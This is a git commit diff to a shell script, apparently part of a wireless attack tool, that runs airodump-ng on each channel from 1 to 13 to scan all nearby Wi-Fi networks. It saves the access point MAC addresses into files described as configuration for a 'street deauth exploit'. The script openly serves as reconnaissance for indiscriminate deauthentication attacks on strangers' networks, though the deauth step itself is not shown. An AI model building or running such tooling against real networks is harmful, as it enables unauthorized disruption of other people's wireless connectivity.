c910ae5eec7597e5bee70bf5c075ac22370220f3
MR-Binaryum <133718570+MR-Binaryum@users.noreply.github.com>
2024-01-05 07:27:45 +0000

    Update maker.sh

--- maker.sh
+++ maker.sh
@@ -11,10 +11,40 @@ echo "put youre interface name in monitor mode in the next input"
                                         read -p "└─────►$(tput setaf 7) " interfaceMon
 
 
+echo ""
 echo "the exploits files gonna late 5 minutes to sniff all near networks to make street deauth attack please be pattient..."
 echo ""
-for o in {1..15};do
-sudo airodump-ng --output-format kismet --write generated $interfaceMon >> /dev/null &
-sleep 14
+
+for chann in {1..13}; do
+exitfile="generated_$chann"
+
+sudo timeout 15s xterm -e airodump-ng -c $chann --output-format kismet --write $exitfile $interfaceMon >> /dev/null &&
+
+echo "maked channel $chann file for street deauth exploit..."
+
+sed -i '1d' generated_$chann-01.kismet.csv
+
+echo "showing networks in channel $chann..."
+
+echo ""
+echo  "${Red}SerialNo        WiFi Channel${White}        WiFi Network${White}"
+echo "---------------------------------------------------------------------------------------"
+awk -F';' '{print "     " $6 "               " $3}' generated_$chann-01.kismet.csv  | nl -n ln -w 8
+
+
+echo ""
+echo "sending AP MAC addresses in channel $chann to export file..."
+sleep 3
+awk -F';' '{print "     " $4 }' generated_$chann-01.kismet.csv >> APs$chann.txt
+sed -i '/BSSID/d' APs$chann.txt
+echo ""
+echo "showing MACs in channel $chann..."
+echo ""
+cat APs$chann.txt
+echo ""
+echo "Waiting before showing results in next hop channel..."
+
 done
-echo maked $o files for street deauth exploit...
+
+echo ""
+echo "all configure files ready..."
